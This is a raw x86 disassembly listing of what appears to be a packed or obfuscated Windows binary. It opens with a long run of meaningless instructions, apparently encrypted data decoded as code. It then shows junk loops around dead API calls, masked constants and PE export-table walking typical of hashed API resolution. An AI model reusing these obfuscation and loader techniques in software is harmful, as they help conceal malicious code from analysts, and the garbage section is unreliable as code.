  404676:	fwait
  404677:	adc    esp,edi
  404679:	and    DWORD PTR [edx+0x1481e339],ebp
  40467f:	dec    ecx
  404680:	test   DWORD PTR [ecx+eax*1+0x59],esp
  404684:	xor    esp,DWORD PTR [ebx]
  404686:	dec    ebp
  404687:	ins    BYTE PTR es:[edi],dx
  404688:	out    dx,eax
  404689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40468a:	repz inc esp
  40468c:	pop    DWORD PTR [edi-0x115aab40]
  404692:	dec    edi
  404693:	or     al,BYTE PTR [ebp-0x1e97a575]
  404699:	mov    al,ds:0x67991634
  40469e:	cs cmp al,0x25
  4046a1:	jmp    0xf9ab99ad
  4046a6:	jbe    0x4046dd
  4046a8:	ins    BYTE PTR es:[edi],dx
  4046a9:	popa   
  4046aa:	or     eax,0x8b260271
  4046af:	xchg   ecx,eax
  4046b0:	sbb    esi,edx
  4046b2:	js     0x404674
  4046b4:	stos   BYTE PTR es:[edi],al
  4046b5:	push   ss
  4046b6:	cmc    
  4046b7:	dec    ecx
  4046b8:	mov    edx,0x7633ea54
  4046bd:	pusha  
  4046be:	xor    ecx,edi
  4046c0:	or     BYTE PTR [eax-0x4c01eeb3],al
  4046c6:	in     eax,dx
  4046c7:	hlt    
  4046c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046c9:	xlat   BYTE PTR ds:[ebx]
  4046ca:	mov    edi,eax
  4046cc:	or     ebx,DWORD PTR [edi+0x4c813f1e]
  4046d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046d3:	adc    DWORD PTR [ebp-0x2d7e9b6d],ebp
  4046d9:	cmp    al,0x3d
  4046db:	fisub  WORD PTR ds:0x5dfaca4
  4046e1:	mov    ecx,es
  4046e3:	mov    eax,0x589968ac
  4046e8:	jnp    0x404702
  4046ea:	stos   DWORD PTR es:[edi],eax
  4046eb:	and    al,0x97
  4046ed:	fwait
  4046ee:	repnz pusha 
  4046f0:	cmp    BYTE PTR [ecx],bh
  4046f2:	(bad)
  4046f5:	adc    BYTE PTR [esi+0x42],0x65
  4046f9:	xor    DWORD PTR [ebx+0x56],edi
  4046fc:	or     al,BYTE PTR [eax+0x61]
  4046ff:	outs   dx,DWORD PTR ds:[esi]
  404700:	xchg   ecx,eax
  404701:	stos   DWORD PTR es:[edi],eax
  404702:	test   BYTE PTR [eax],0x23
  404705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404706:	cdq    
  404707:	sub    cl,dl
  404709:	add    dh,bh
  40470b:	xchg   ebp,eax
  40470c:	jp     0x40472a
  40470e:	rol    BYTE PTR [ebx+ebx*8+0x6c982023],0x19
  404716:	xor    eax,0xe2ad5031
  40471b:	adc    cl,bl
  40471d:	pushf  
  40471e:	adc    DWORD PTR [eiz*8+0x2997e6df],ebp
  404725:	pop    ecx
  404726:	push   ecx
  404727:	xchg   esp,eax
  404728:	jle    0x40475a
  40472a:	push   esp
  40472b:	std    
  40472c:	sub    bh,BYTE PTR es:[edi+eiz*8]
  404730:	add    dl,BYTE PTR fs:[ecx]
  404733:	dec    ecx
  404734:	pop    ebp
  404735:	cwde   
  404736:	xor    ecx,DWORD PTR [esi]
  404738:	pop    ss
  404739:	mov    edi,edx
  40473b:	shr    esi,0x4d
  40473e:	jnp    0x404718
  404740:	jl     0x404731
  404742:	into   
  404743:	test   BYTE PTR [ebp+0xa],bh
  404746:	jne    0x4047a9
  404748:	xlat   BYTE PTR ds:[ebx]
  404749:	loope  0x40477f
  40474b:	xlat   BYTE PTR ds:[ebx]
  40474c:	xchg   ebx,eax
  40474d:	jo     0x4046d1
  40474f:	out    0x5a,eax
  404751:	aaa    
  404752:	jo     0x4046f6
  404754:	or     dh,BYTE PTR [eax+esi*8]
  404757:	push   edx
  404758:	jne    0x404714
  40475a:	push   edi
  40475b:	push   edi
  40475c:	lds    edi,FWORD PTR [ebx+0x37825ee7]
  404762:	add    al,0x14
  404764:	aad    0x6d
  404766:	xchg   edx,eax
  404767:	or     BYTE PTR [edx+0x0],0x73
  40476b:	lea    ecx,[ebp-0x7cf5b0be]
  404771:	repz and dl,ch
  404774:	ret    
  404775:	mov    dh,0x77
  404777:	jnp    0x404744
  404779:	jnp    0x404781
  40477b:	or     al,0x4b
  40477d:	xor    ebx,DWORD PTR [ebp+0x661493d2]
  404783:	addr16 mov bl,0x58
  404786:	pop    edx
  404787:	xor    bh,al
  404789:	adc    BYTE PTR [esi-0x19deee75],dh
  40478f:	fisttp WORD PTR [eax+0x67]
  404792:	mov    esp,0x6c863087
  404797:	inc    edi
  404798:	repz clc 
  40479a:	js     0x40478e
  40479c:	fild   WORD PTR ds:0x1adaa753
  4047a2:	fdiv   QWORD PTR [edi+ebx*2-0x9c6248b]
  4047a9:	mov    cl,0x46
  4047ab:	push   0xffffffce
  4047ad:	hlt    
  4047ae:	in     al,dx
  4047af:	mov    WORD PTR [ebx],?
  4047b1:	jno    0x404794
  4047b3:	add    edx,0xb
  4047b6:	jo     0x4047cc
  4047b8:	xchg   DWORD PTR [ebx],ebx
  4047ba:	jg     0x404835
  4047bc:	pop    esp
  4047bd:	add    ch,bh
  4047bf:	jo     0x404742
  4047c1:	js     0x4047e6
  4047c3:	push   0xffffffba
  4047c5:	sub    DWORD PTR [ecx],esp
  4047c7:	mov    eax,DWORD PTR [ecx-0x27879c13]
  4047cd:	xor    al,0xcb
  4047cf:	jne    0x404809
  4047d1:	xor    ch,dl
  4047d3:	jae    0x404845
  4047d5:	inc    ebx
  4047d6:	in     eax,0x49
  4047d8:	in     al,dx
  4047d9:	in     eax,0x88
  4047db:	or     BYTE PTR [ecx],ah
  4047dd:	lods   al,BYTE PTR ds:[esi]
  4047de:	pop    esp
  4047df:	in     al,dx
  4047e0:	popf   
  4047e1:	and    DWORD PTR [esi-0x121d9a34],edx
  4047e7:	cwde   
  4047e8:	push   esp
  4047e9:	adc    eax,DWORD PTR [edx+0x46]
  4047ec:	jmp    0xc717:0x582f003
  4047f3:	shr    BYTE PTR [ecx-0x49932eee],1
  4047f9:	lea    edx,[eax]
  4047fb:	push   0xffffffbf
  4047fd:	ret    
  4047fe:	test   al,0xfd
  404800:	xchg   ebx,eax
  404801:	rol    eax,cl
  404803:	pop    edx
  404804:	inc    esi
  404805:	nop
  404806:	or     al,BYTE PTR [eax-0x364f05f3]
  40480c:	dec    ecx
  40480d:	(bad)  
  40480e:	addr16 sbb eax,0xaca99d68
  404814:	mov    edx,DWORD PTR [edi+0x3a]
  404817:	in     al,dx
  404818:	imul   ecx,DWORD PTR [eax],0xffffffdf
  40481b:	rcl    DWORD PTR [edx],cl
  40481d:	inc    ecx
  40481e:	cli    
  40481f:	sbb    DWORD PTR fs:[esi+0x5834de8f],esp
  404826:	add    al,0xe2
  404828:	test   DWORD PTR ds:0xa6c2b5cf,0x6cd056
  404832:	sbb    eax,0xa012969c
  404837:	scas   eax,DWORD PTR es:[edi]
  404838:	sub    eax,0xfb618944
  40483d:	mov    al,ds:0xd667b613
  404842:	jne    0x404813
  404844:	sbb    edi,DWORD PTR [eax+0x21]
  404847:	mov    dl,0x71
  404849:	(bad)  
  40484a:	neg    ecx
  40484c:	int    0xd6
  40484e:	iret   
  40484f:	test   eax,0xa6172319
  404854:	jge    0x4047dd
  404856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404857:	call   0x3b7c:0xde8cf4a5
  40485e:	int3   
  40485f:	mov    al,ds:0x553cc2c2
  404864:	inc    ecx
  404865:	pushf  
  404866:	bsf    ecx,DWORD PTR [eax+0x32]
  40486a:	int    0x8b
  40486c:	or     ebp,DWORD PTR [esi]
  40486e:	dec    ebx
  40486f:	in     eax,0x2c
  404871:	cli    
  404872:	inc    esp
  404873:	sahf   
  404874:	jl     0x40486f
  404876:	cmp    bh,BYTE PTR [ebx+0x3dc275a3]
  40487c:	cmp    eax,0xa326407d
  404881:	std    
  404882:	and    DWORD PTR [ecx+0x5cccbbfd],eax
  404888:	fild   DWORD PTR [ecx+0x12]
  40488b:	sar    BYTE PTR [ecx],1
  40488d:	xchg   esp,eax
  40488e:	scas   eax,DWORD PTR es:[edi]
  40488f:	jne    0x40486c
  404891:	mov    edx,0x4f4b4da6
  404896:	and    ebp,esp
  404898:	add    al,0x53
  40489a:	out    dx,al
  40489b:	test   eax,0x1cc09ae9
  4048a0:	das    
  4048a1:	mov    edx,0x52217f16
  4048a6:	sti    
  4048a7:	js     0x40485a
  4048a9:	inc    esp
  4048aa:	cld    
  4048ab:	push   eax
  4048ac:	shl    bl,cl
  4048ae:	push   edi
  4048af:	jb     0x404879
  4048b1:	and    BYTE PTR [edx+edx*8-0x101f89db],cl
  4048b8:	xchg   ebp,eax
  4048b9:	mov    cl,0x7b
  4048bb:	mov    eax,0xb8f7a1cc
  4048c0:	loopne 0x404893
  4048c2:	bound  ebp,QWORD PTR [ebx+ebx*1-0x45085e95]
  4048c9:	cmp    al,0x80
  4048cb:	fisttp WORD PTR [edi+0x6e5fbaef]
  4048d1:	stos   BYTE PTR es:[edi],al
  4048d2:	dec    esp
  4048d3:	pop    eax
  4048d4:	cwde   
  4048d5:	dec    edx
  4048d6:	push   cs
  4048d7:	popf   
  4048d8:	pusha  
  4048d9:	dec    edx
  4048da:	data16 cld 
  4048dc:	mov    ebx,0xcf78adf7
  4048e1:	scas   al,BYTE PTR es:[edi]
  4048e2:	int3   
  4048e3:	test   BYTE PTR [edx+0x3a],cl
  4048e6:	xor    eax,eax
  4048e8:	mov    ebx,eax
  4048ea:	bound  edi,QWORD PTR [esi-0x66]
  4048ed:	sub    DWORD PTR [esi],0x5c1f6990
  4048f3:	imul   ebx,DWORD PTR [edx],0x91edbab6
  4048f9:	jae    0x404905
  4048fb:	push   ds
  4048fc:	stc    
  4048fd:	pop    eax
  4048fe:	dec    ebx
  4048ff:	xor    DWORD PTR [esi+esi*8],ebp
  404902:	xchg   esi,eax
  404903:	cmp    cl,bh
  404905:	jns    0x40490b
  404907:	rcl    DWORD PTR [esp+esi*8],1
  40490a:	pop    ds
  40490b:	mov    ah,0x6e
  40490d:	das    
  40490e:	mov    dl,0xaa
  404910:	popf   
  404911:	push   ss
  404912:	push   es
  404913:	xor    bl,BYTE PTR [esi]
  404915:	or     ebx,DWORD PTR [edi-0x5ac44cf6]
  40491b:	inc    DWORD PTR [ebp+0x4b02a48b]
  404921:	ret    
  404922:	mov    ah,0x1c
  404924:	fcom   DWORD PTR [ebx+ecx*1]
  404927:	cmp    DWORD PTR [edi+eiz*8-0x374ec744],ecx
  40492e:	rcr    ebx,0x5d
  404931:	lods   al,BYTE PTR ds:[esi]
  404932:	jmp    DWORD PTR [edx+0x44362f8b]
  404938:	jle    0x404922
  40493a:	daa    
  40493b:	icebp  
  40493c:	mov    bl,0x8f
  40493e:	cld    
  40493f:	and    ah,BYTE PTR [ebx+eax*4-0x6b]
  404943:	push   cs
  404944:	xchg   esi,ebp
  404946:	mov    ch,ah
  404948:	out    0x76,eax
  40494a:	in     eax,dx
  40494b:	xor    DWORD PTR [ebx-0x37],0xffffffb5
  40494f:	xchg   bl,dh
  404951:	inc    esp
  404952:	xlat   BYTE PTR ds:[ebx]
  404953:	es std 
  404955:	gs cwde 
  404957:	mov    ebx,0xdc91244c
  40495c:	sub    eax,0xaebf34c
  404961:	pop    es
  404962:	ins    BYTE PTR es:[edi],dx
  404963:	inc    esp
  404964:	jns    0x4049d4
  404966:	dec    esp
  404967:	mov    eax,0xe8a5d5fc
  40496c:	xchg   edi,eax
  40496d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40496e:	ja     0x40494c
  404970:	pushf  
  404971:	nop
  404972:	push   esi
  404973:	mov    ch,0x4e
  404975:	(bad)  
  404977:	mov    esi,0xf2a00717
  40497c:	sar    ebp,cl
  40497e:	shl    DWORD PTR [ebx-0x7cf1460d],cl
  404984:	mov    dl,0xdf
  404986:	push   eax
  404987:	inc    ecx
  404988:	cmp    eax,0x13ec5baa
  40498d:	loopne 0x4049a2
  40498f:	mov    dh,0xbd
  404991:	xor    eax,0x5b8e5178
  404996:	push   esi
  404997:	or     esi,0x64f0
  40499d:	mov    edx,0x751089b
  4049a2:	add    DWORD PTR ds:0x435018,0x3361
  4049ac:	xor    ecx,edx
  4049ae:	and    DWORD PTR ds:0x435010,0x0
  4049b8:	xor    esi,esi
  4049ba:	or     esi,DWORD PTR ds:0x435010
  4049c0:	inc    esi
  4049c1:	mov    DWORD PTR ds:0x435010,esi
  4049c7:	cmp    DWORD PTR ds:0x435010,0xb
  4049ce:	jl     0x404a0b
  4049d4:	jmp    0x4049e4
  4049d9:	push   0x1955
  4049de:	call   DWORD PTR ds:0x43a8c4
  4049e4:	cmp    DWORD PTR ds:0x435010,0xa
  4049eb:	jne    0x4049fe
  4049f1:	mov    esi,DWORD PTR ds:0x435010
  4049f7:	inc    esi
  4049f8:	mov    DWORD PTR ds:0x435010,esi
  4049fe:	cmp    DWORD PTR ds:0x435010,0x1c
  404a05:	jb     0x4049b8
  404a0b:	mov    esi,0x3272e2
  404a10:	or     DWORD PTR ds:0x436018,0x436014
  404a1a:	push   edi
  404a1b:	add    edi,DWORD PTR ds:0x43800c
  404a21:	mov    edi,DWORD PTR [ebp+0x10]
  404a24:	add    ecx,esi
  404a26:	mov    DWORD PTR ds:0x43500c,0x38f3
  404a30:	cmp    ecx,edi
  404a32:	mov    DWORD PTR ds:0x43401c,0x3286
  404a3c:	je     0x404b8f
  404a42:	mov    ecx,DWORD PTR [ebp-0x4]
  404a45:	sbb    edi,DWORD PTR ds:0x435014
  404a4b:	mov    edi,DWORD PTR [ebp+0x10]
  404a4e:	xor    eax,eax
  404a50:	xor    DWORD PTR ds:0x435018,0x434028
  404a5a:	xor    ecx,edx
  404a5c:	add    ecx,esi
  404a5e:	mov    DWORD PTR ds:0x434024,0x7740
  404a68:	add    edi,0xfabdbee7
  404a6e:	adc    eax,0xffffffff
  404a71:	inc    DWORD PTR ds:0x437010
  404a77:	xor    eax,0x0
  404a7a:	or     DWORD PTR ds:0x438008,0x434024
  404a84:	mov    DWORD PTR [ebp-0xc],eax
  404a87:	push   ebx
  404a88:	xor    ebx,ebx
  404a8a:	adc    DWORD PTR ds:0x43400c,0x682
  404a94:	xor    edi,0x8a29a12d
  404a9a:	mov    DWORD PTR ds:0x436008,0x12
  404aa4:	cmp    DWORD PTR ds:0x436008,0x0
  404aab:	je     0x404af4
  404ab1:	cmp    DWORD PTR ds:0x436008,0x3
  404ab8:	jle    0x404af4
  404abe:	jmp    0x404acc
  404ac3:	push   DWORD PTR [ebp-0x18]
  404ac6:	call   DWORD PTR ds:0x43a8c8
  404acc:	cmp    DWORD PTR ds:0x436008,0x4
  404ad3:	jne    0x404ae4
  404ad9:	mov    eax,ds:0x436008
  404ade:	dec    eax
  404adf:	mov    ds:0x436008,eax
  404ae4:	mov    eax,ds:0x436008
  404ae9:	dec    eax
  404aea:	mov    ds:0x436008,eax
  404aef:	jmp    0x404aa4
  404af4:	mov    eax,ecx
  404af6:	add    eax,0xfabdbee7
  404afb:	adc    ebx,0xffffffff
  404afe:	xor    eax,0x8a29a12d
  404b03:	xor    ebx,0x0
  404b06:	cmp    eax,edi
  404b08:	jne    0x404b21
  404b0e:	cmp    ebx,DWORD PTR [ebp-0xc]
  404b11:	je     0x404b89
  404b17:	jmp    0x404b21
  404b1c:	mov    esi,0x3272e2
  404b21:	mov    eax,DWORD PTR [ebp-0x4]
  404b24:	mov    edi,DWORD PTR [ebp-0x8]
  404b27:	xor    edi,edx
  404b29:	add    edi,esi
  404b2b:	mov    esi,DWORD PTR [ebp+0x8]
  404b2e:	imul   edi,ecx
  404b31:	mov    ebx,DWORD PTR [ebp+0xc]
  404b34:	xor    eax,edx
  404b36:	add    eax,ecx
  404b38:	mov    al,BYTE PTR [ebx+eax*1+0x3272e2]
  404b3f:	mov    BYTE PTR [edi+esi*1],al
  404b42:	mov    eax,DWORD PTR [ebp-0x8]
  404b45:	mov    esi,DWORD PTR [ebp+0x10]
  404b48:	xor    eax,edx
  404b4a:	xor    ebx,ebx
  404b4c:	add    esi,0xfabdbee7
  404b52:	adc    ebx,0xffffffff
  404b55:	lea    ecx,[ecx+eax*1+0x3272e2]
  404b5c:	xor    edi,edi
  404b5e:	xor    esi,0x8a29a12d
  404b64:	xor    ebx,0x0
  404b67:	mov    eax,ecx
  404b69:	add    eax,0xfabdbee7
  404b6e:	adc    edi,0xffffffff
  404b71:	xor    eax,0x8a29a12d
  404b76:	xor    edi,0x0
  404b79:	cmp    eax,esi
  404b7b:	jne    0x404b1c
  404b81:	cmp    edi,ebx
  404b83:	jne    0x404b1c
  404b89:	mov    eax,0xf89c8584
  404b8e:	pop    ebx
  404b8f:	pop    edi
  404b90:	pop    esi
  404b91:	leave  
  404b92:	ret    0xc
  404b95:	push   ebp
  404b96:	mov    ebp,esp
  404b98:	push   ecx
  404b99:	add    DWORD PTR ds:0x43701c,0x56ef
  404ba3:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  404baa:	mov    eax,DWORD PTR [ebp+0x8]
  404bad:	movsx  eax,BYTE PTR [eax]
  404bb0:	and    DWORD PTR ds:0x436004,0x0
  404bba:	mov    ecx,DWORD PTR ds:0x436004
  404bc0:	inc    ecx
  404bc1:	mov    DWORD PTR ds:0x436004,ecx
  404bc7:	cmp    DWORD PTR ds:0x436004,0x6
  404bce:	ja     0x404c0b
  404bd4:	jmp    0x404be4
  404bd9:	push   0x43a0c9
  404bde:	call   DWORD PTR ds:0x43a8d0
  404be4:	cmp    DWORD PTR ds:0x436004,0x5
  404beb:	jne    0x404bfe
  404bf1:	mov    ecx,DWORD PTR ds:0x436004
  404bf7:	inc    ecx
  404bf8:	mov    DWORD PTR ds:0x436004,ecx
  404bfe:	cmp    DWORD PTR ds:0x436004,0x18
  404c05:	jb     0x404bba
  404c0b:	mov    edx,0x3272e2
  404c10:	neg    ecx
  404c12:	sub    eax,edx
  404c14:	mov    ecx,0x751089b
  404c19:	xor    eax,ecx
  404c1b:	mov    DWORD PTR ds:0x43600c,0x18ff
  404c25:	cmp    eax,0xf89c85f0
  404c2a:	jne    0x404c59
  404c30:	mov    eax,DWORD PTR [ebp+0x8]
  404c33:	push   esi
  404c34:	mov    esi,DWORD PTR [ebp+0x8]
  404c37:	add    esi,DWORD PTR [eax+0x3c]
  404c3a:	mov    DWORD PTR [ebp+0x8],esi
  404c3d:	mov    eax,DWORD PTR [ebp-0x4]
  404c40:	mov    esi,DWORD PTR [ebp+0x8]
  404c43:	xor    eax,ecx
  404c45:	add    eax,edx
  404c47:	cmp    DWORD PTR [esi+0x54],eax
  404c4a:	pop    esi
  404c4b:	je     0x404c59
  404c51:	mov    eax,DWORD PTR [ebp+0x8]
  404c54:	jmp    0x404c60
  404c59:	mov    eax,DWORD PTR [ebp-0x4]
  404c5c:	xor    eax,ecx
  404c5e:	add    eax,edx
  404c60:	leave  
  404c61:	ret    0x4
  404c64:	push   ebp
  404c65:	mov    ebp,esp
  404c67:	sub    esp,0x38
  404c6a:	or     DWORD PTR ds:0x43500c,0x434024
  404c74:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  404c7b:	mov    eax,ds:0x437004
  404c80:	or     DWORD PTR ds:0x434004,eax
  404c86:	push   ebx
  404c87:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  404c8e:	adc    DWORD PTR ds:0x434020,edi
  404c94:	mov    eax,DWORD PTR [ebp-0x4]
  404c97:	xor    DWORD PTR ds:0x437018,0x773f
  404ca1:	push   esi
  404ca2:	xor    DWORD PTR ds:0x435010,0x4a66
  404cac:	mov    esi,0x751089b
  404cb1:	and    DWORD PTR ds:0x435018,0x354c
  404cbb:	xor    eax,esi
  404cbd:	not    DWORD PTR ds:0x436018
  404cc3:	push   edi
  404cc4:	mov    edi,0x3272e2
  404cc9:	add    eax,edi
  404ccb:	xor    DWORD PTR ds:0x434018,0x434000
  404cd5:	mov    DWORD PTR [ebp-0x1c],eax
  404cd8:	and    DWORD PTR ds:0x438010,0x0
  404ce2:	mov    eax,ds:0x438010
  404ce7:	inc    eax
  404ce8:	mov    ds:0x438010,eax
  404ced:	cmp    DWORD PTR ds:0x438010,0xb
  404cf4:	jb     0x404d2f
  404cfa:	jmp    0x404d0a
  404cff:	push   0x43a097
  404d04:	call   DWORD PTR ds:0x43a8d4
  404d0a:	cmp    DWORD PTR ds:0x438010,0xa
  404d11:	jne    0x404d22
  404d17:	mov    eax,ds:0x438010
  404d1c:	inc    eax
  404d1d:	mov    ds:0x438010,eax
  404d22:	cmp    DWORD PTR ds:0x438010,0x14
  404d29:	jb     0x404ce2
  404d2f:	mov    eax,DWORD PTR [ebp+0x14]
  404d32:	sbb    DWORD PTR ds:0x437008,0x2430
  404d3c:	test   eax,eax
  404d3e:	je     0x404d99
  404d44:	and    DWORD PTR ds:0x438000,edx
  404d4a:	mov    eax,DWORD PTR [ebp+0x14]
  404d4d:	and    DWORD PTR ds:0x435014,0x0
  404d57:	xor    ebx,ebx
  404d59:	add    ebx,DWORD PTR ds:0x435014
  404d5f:	inc    ebx
  404d60:	mov    DWORD PTR ds:0x435014,ebx
  404d66:	cmp    DWORD PTR ds:0x435014,0x29
  404d6d:	jl     0x404d8e
  404d73:	jmp    0x404d81
  404d78:	push   DWORD PTR [ebp-0x24]
  404d7b:	call   DWORD PTR ds:0x43a8dc
  404d81:	cmp    DWORD PTR ds:0x435014,0x1a
  404d88:	jb     0x404d57
  404d8e:	mov    eax,DWORD PTR [eax]
  404d90:	or     ebx,DWORD PTR ds:0x438014
  404d96:	mov    DWORD PTR [ebp-0x1c],eax
  404d99:	or     DWORD PTR ds:0x436008,0x1828
  404da3:	mov    eax,DWORD PTR [ebp-0x4]
  404da6:	adc    DWORD PTR ds:0x437014,edi
  404dac:	xor    eax,esi
  404dae:	xor    ebx,ebx
  404db0:	or     ebx,DWORD PTR ds:0x436018
  404db6:	xor    DWORD PTR ds:0x434004,ebx
  404dbc:	add    eax,edi
  404dbe:	mov    DWORD PTR [ebp-0x8],eax
  404dc1:	add    DWORD PTR ds:0x43601c,0x710e
  404dcb:	mov    eax,DWORD PTR [ebp-0xc]
  404dce:	xor    ebx,ebx
  404dd0:	add    ebx,DWORD PTR ds:0x438008
  404dd6:	and    DWORD PTR ds:0x438018,ebx
  404ddc:	xor    eax,esi
  404dde:	and    DWORD PTR ds:0x438010,0x0
  404de8:	xor    ebx,ebx
  404dea:	add    ebx,DWORD PTR ds:0x438010
  404df0:	inc    ebx
  404df1:	mov    DWORD PTR ds:0x438010,ebx
  404df7:	cmp    DWORD PTR ds:0x438010,0x29
  404dfe:	jg     0x404e2c
  404e04:	jmp    0x404e1f
  404e09:	push   0x43a097
  404e0e:	push   DWORD PTR [ebp-0x24]
  404e11:	push   0x5041
  404e16:	push   DWORD PTR [ebp-0x1c]
  404e19:	call   DWORD PTR ds:0x43a8e0
  404e1f:	cmp    DWORD PTR ds:0x438010,0x1d
  404e26:	jb     0x404de8
  404e2c:	add    eax,edi
  404e2e:	movzx  ebx,WORD PTR ds:0x434018
  404e35:	sbb    ebx,DWORD PTR ds:0x434000
  404e3b:	mov    DWORD PTR ds:0x434018,ebx
  404e41:	mov    DWORD PTR [ebp-0x24],eax
  404e44:	mov    eax,DWORD PTR [ebp-0x4]
  404e47:	and    DWORD PTR ds:0x437004,edx
  404e4d:	xor    eax,esi
  404e4f:	add    eax,edi
  404e51:	add    DWORD PTR ds:0x43600c,0x546e
  404e5b:	mov    DWORD PTR [ebp-0x30],eax
  404e5e:	sub    eax,ebx
  404e60:	mov    ebx,DWORD PTR [ebp-0x4]
  404e63:	sub    DWORD PTR ds:0x435008,0x4ecf
  404e6d:	xor    ebx,esi
  404e6f:	sub    DWORD PTR ds:0x436004,edx
  404e75:	add    ebx,edi
  404e77:	adc    DWORD PTR ds:0x438000,0x4ed2
  404e81:	mov    eax,DWORD PTR [ebp-0x24]
  404e84:	xor    DWORD PTR ds:0x435018,0x43700c
  404e8e:	sub    eax,edi
  404e90:	lea    ecx,[ebx-0x3272e2]
  404e96:	xor    eax,esi
  404e98:	adc    DWORD PTR ds:0x436010,0x436014
  404ea2:	xor    ecx,esi
  404ea4:	mov    DWORD PTR ds:0x438004,0x37e0
  404eae:	cmp    ecx,eax
  404eb0:	mov    DWORD PTR ds:0x437000,0x70b7
  404eba:	je     0x4051ec
  404ec0:	and    DWORD PTR ds:0x43701c,0x0
  404eca:	xor    eax,eax
  404ecc:	or     eax,DWORD PTR ds:0x43701c
  404ed2:	inc    eax
  404ed3:	mov    ds:0x43701c,eax
  404ed8:	cmp    DWORD PTR ds:0x43701c,0x6
  404edf:	ja     0x404f2d
  404ee5:	jmp    0x404f08
  404eea:	push   DWORD PTR [ebp-0xc]
  404eed:	push   0x434024
  404ef2:	push   DWORD PTR [ebp-0x10]
  404ef5:	push   0x43a000
  404efa:	push   0x794f
  404eff:	push   DWORD PTR [ebp-0x28]
  404f02:	call   DWORD PTR ds:0x43a8e4
  404f08:	cmp    DWORD PTR ds:0x43701c,0x5
  404f0f:	jne    0x404f20
  404f15:	mov    eax,ds:0x43701c
  404f1a:	inc    eax
  404f1b:	mov    ds:0x43701c,eax
  404f20:	cmp    DWORD PTR ds:0x43701c,0x10
  404f27:	jb     0x404eca
  404f2d:	mov    eax,DWORD PTR [ebp-0x4]
  404f30:	xor    eax,esi
  404f32:	sub    DWORD PTR ds:0x435000,0x434020
  404f3c:	add    eax,edi
  404f3e:	cmp    ebx,eax
  404f40:	jne    0x4051c9
  404f46:	adc    DWORD PTR ds:0x437008,0x435000
  404f50:	push   DWORD PTR [ebp+0x8]
  404f53:	adc    DWORD PTR ds:0x43600c,0x30f1
  404f5d:	call   0x404b95
  404f62:	mov    ecx,DWORD PTR ds:0x437010
  404f68:	sub    DWORD PTR ds:0x434024,ecx
  404f6e:	mov    DWORD PTR [ebp-0x14],eax
  404f71:	and    DWORD PTR ds:0x437014,0x0
  404f7b:	mov    eax,ds:0x437014
  404f80:	inc    eax
  404f81:	mov    ds:0x437014,eax
  404f86:	cmp    DWORD PTR ds:0x437014,0x5
  404f8d:	jl     0x404fd1
  404f93:	jmp    0x404fac
  404f98:	push   DWORD PTR [ebp-0x1c]
  404f9b:	push   0x89c7
  404fa0:	push   DWORD PTR [ebp-0x20]
  404fa3:	push   DWORD PTR [ebp-0x28]
  404fa6:	call   DWORD PTR ds:0x43a8e8
  404fac:	cmp    DWORD PTR ds:0x437014,0x4
  404fb3:	jne    0x404fc4
  404fb9:	mov    eax,ds:0x437014
  404fbe:	inc    eax
  404fbf:	mov    ds:0x437014,eax
  404fc4:	cmp    DWORD PTR ds:0x437014,0x1b
  404fcb:	jb     0x404f7b
  404fd1:	mov    eax,DWORD PTR [ebp-0x4]
  404fd4:	add    ecx,0x29bc
  404fda:	mov    ecx,DWORD PTR [ebp-0x14]
  404fdd:	or     DWORD PTR ds:0x43401c,0x7fb4
  404fe7:	xor    eax,esi
  404fe9:	add    eax,edi
  404feb:	cmp    ecx,eax
  404fed:	je     0x405257
  404ff3:	push   DWORD PTR [ebp-0x14]
  404ff6:	and    DWORD PTR ds:0x438000,0x39ab
  405000:	push   DWORD PTR [ebp+0x8]
  405003:	xor    DWORD PTR ds:0x437010,0x438000
  40500d:	call   0x40a3b2
  405012:	sbb    DWORD PTR ds:0x438014,0x3483
  40501c:	mov    DWORD PTR [ebp-0x14],eax
  40501f:	or     ecx,0x551e
  405025:	mov    eax,DWORD PTR [ebp-0x4]
  405028:	mov    ecx,DWORD PTR ds:0x434010
  40502e:	or     DWORD PTR ds:0x437014,ecx
  405034:	mov    ecx,DWORD PTR [ebp-0x14]
  405037:	sub    DWORD PTR ds:0x43801c,0xa60
  405041:	xor    eax,esi
  405043:	add    eax,edi
  405045:	mov    DWORD PTR ds:0x435004,0x1802
  40504f:	cmp    ecx,eax
  405051:	je     0x405257
  405057:	mov    DWORD PTR ds:0x43701c,0x15
  405061:	cmp    DWORD PTR ds:0x43701c,0x0
  405068:	je     0x4050b4
  40506e:	cmp    DWORD PTR ds:0x43701c,0xa
  405075:	jb     0x4050b4
  40507b:	jmp    0x405086
  405080:	call   DWORD PTR ds:0x43a8f0
  405086:	cmp    DWORD PTR ds:0x43701c,0xb
  40508d:	jne    0x4050a0
  405093:	mov    ecx,DWORD PTR ds:0x43701c
  405099:	dec    ecx
  40509a:	mov    DWORD PTR ds:0x43701c,ecx
  4050a0:	xor    ecx,ecx
  4050a2:	or     ecx,DWORD PTR ds:0x43701c
  4050a8:	dec    ecx
  4050a9:	mov    DWORD PTR ds:0x43701c,ecx
  4050af:	jmp    0x405061
  4050b4:	mov    eax,DWORD PTR [ebp-0x14]
  4050b7:	sub    DWORD PTR ds:0x436010,edi
  4050bd:	mov    eax,DWORD PTR [eax+0x18]
  4050c0:	adc    DWORD PTR ds:0x436000,ebx
  4050c6:	mov    DWORD PTR [ebp-0x24],eax
  4050c9:	mov    DWORD PTR ds:0x434028,0x1f
  4050d3:	cmp    DWORD PTR ds:0x434028,0x0
  4050da:	je     0x40510b
  4050e0:	cmp    DWORD PTR ds:0x434028,0x27
  4050e7:	jl     0x40510b
  4050ed:	jmp    0x4050fb
  4050f2:	push   DWORD PTR [ebp-0x14]
  4050f5:	call   DWORD PTR ds:0x43a8f4
  4050fb:	mov    eax,ds:0x434028
  405100:	dec    eax
  405101:	mov    ds:0x434028,eax
  405106:	jmp    0x4050d3
  40510b:	mov    eax,DWORD PTR [ebp-0x14]
  40510e:	or     ecx,0x2a6b
  405114:	mov    ecx,DWORD PTR [ebp+0x8]
  405117:	xor    DWORD PTR ds:0x438000,0x69f8
  405121:	add    ecx,DWORD PTR [eax+0x20]
